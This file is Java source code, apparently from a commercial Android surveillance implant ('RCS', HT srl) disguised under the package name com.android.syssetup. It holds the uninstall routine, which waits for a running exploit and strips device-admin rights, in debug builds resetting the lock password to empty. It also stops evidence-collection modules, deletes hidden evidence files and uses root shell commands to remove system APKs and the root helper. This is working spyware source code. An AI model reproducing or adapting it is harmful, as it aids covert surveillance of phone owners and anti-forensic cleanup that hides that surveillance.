/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : UninstallAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.action;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import com.android.mm.M;
import com.android.syssetup.Beep;
import com.android.syssetup.Core;
import com.android.syssetup.Root;
import com.android.syssetup.Status;
import com.android.syssetup.Trigger;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfAction;
import com.android.syssetup.conf.Configuration;
import com.android.syssetup.evidence.EvidenceBuilder;
import com.android.syssetup.evidence.EvidenceCollector;
import com.android.syssetup.listener.AdR;
import com.android.syssetup.manager.ManagerEvent;
import com.android.syssetup.manager.ManagerModule;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.Execute;

/**
 * The Class UninstallAction.
 */
public class UninstallAction extends SubActionSlow {

	private static final String TAG = "UninstallAction"; //$NON-NLS-1$

	/**
	 * Instantiates a new uninstall action.
	 *
	 * @param params the conf params
	 */
	public UninstallAction(final ConfAction params) {
		super(params);
	}

	/**
	 * Actual execute.
	 */
	public static boolean actualExecute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualExecute): uninstall");//$NON-NLS-1$
		}
		boolean ret = false;
		synchronized (Status.uninstallLock) {
			Status.uninstall = true;
			// check Core.taskInit
			Core.self().createUninstallMarkup();
			if (Status.getExploitStatus() == Status.EXPLOIT_STATUS_RUNNING) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualExecute), exploit still running...you have to wait");
				}
				return false;
			}

			if (Cfg.DEMO) {
				EvidenceBuilder.info("Uninstall");
			}

			removeAdmin(Status.getAppContext());
			ret = stopServices();
			ret &= removeFiles();
			ret &= deleteApplication();

			if (Status.isPersistent()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualExecute), Something went wrong");
				}

			}

			if (ret || Status.isPersistent() == false) {
				ret &= removeRoot();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualExecute):failed to remove app, " + Configuration.shellFile + "removal skipped");
				}
			}
		}
		System.gc();
		return ret;
	}

	private static boolean removeRoot() {
		if (Status.haveRoot() == true) {
			Process localProcess;

			Execute.execute(String.format(M.e("%s blw"), Configuration.shellFile));
			Execute.executeRoot(M.e("rm /system/app/StkDevice.apk"));

			try {
				localProcess = Runtime.getRuntime().exec(String.format(M.e("%s ru"), Configuration.shellFile));
				localProcess.waitFor();
			} catch (Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}
				return false;
			}
		}
		return true;
	}

	public static void removeAdmin(Context appContext) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeAdmin) ");
		}

		ComponentName devAdminReceiver = new ComponentName(appContext, AdR.class);
		DevicePolicyManager dpm = (DevicePolicyManager) appContext.getSystemService(Context.DEVICE_POLICY_SERVICE);

		if (dpm.isAdminActive(devAdminReceiver)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (removeAdmin) Admin");
			}
			if (Cfg.DEBUG) {
				Check.asserts(Status.self().haveAdmin(), " (removeAdmin) Assert failed, Status doesn't know about admin");
			}

			if (Cfg.DEBUG) {
				dpm.resetPassword("", 0);
			}
			dpm.removeActiveAdmin(devAdminReceiver);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (removeAdmin) no admin");
			}
		}
	}

	/**
	 * Stop agents and events
	 *
	 * @return
	 */
	static boolean stopServices() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopServices)");//$NON-NLS-1$
		}

		ManagerModule.self().stopAll();
		ManagerEvent.self().stopAll();
		Status.unTriggerAll();

		return true;
	}

	/**
	 * Remove markups and logs
	 *
	 * @return
	 */
	static boolean removeFiles() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeFiles)");//$NON-NLS-1$
		}

		final int fileNum = EvidenceCollector.self().removeHidden();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeFiles): " + fileNum);//$NON-NLS-1$
		}

		return true;
	}

	private static boolean deleteApplication() {
		boolean ret = false;

		if (Status.haveRoot()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteApplication) try Root");
			}
			// unhide the icon
			Status.setIconState(false);
			ret = deleteApplicationRoot();
			if (ret == false) {
				// disistallation failed hide again the icon
				Status.setIconState(true);
			}
		}

		if (Status.getPersistencyStatus() <= Status.PERSISTENCY_STATUS_FAILED) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteApplication) go with intent");
			}
			ret = deleteApplicationIntent();
		}

		return ret;
	}

	/**
	 * Deletes the application
	 *
	 * @return
	 */
	static boolean deleteApplicationIntent() {

		// Core core = Core.self();
		// package:com.android.networking
		final Uri packageURI = Uri.parse("package:" + Status.getAppContext().getPackageName()); //$NON-NLS-1$

		if (Cfg.DEBUG) {
			Check.log(TAG + " (deleteApplication): " + packageURI.toString());
		}

		//removeFiles();

		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		Status.getAppContext().startActivity(uninstallIntent);

		//Utils.sleep(5000);
		//Core.self().createUninstallMarkup();

		return true;
	}

	/**
	 * Deletes the application
	 *
	 * @return
	 */
	static boolean deleteApplicationRoot() {
		if (Cfg.DEMO) {
			Beep.beepExit();
		}

		boolean ret = Root.uninstallRoot();

		if (Cfg.DEMO) {
			Beep.beepPenta();
		}

		return ret;
	}

	/*
	 * (non-Javadoc)
	 *
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		Status.uninstall = true;
		return true;
	}

	@Override
	protected boolean parse(ConfAction params) {
		return true;
	}

}
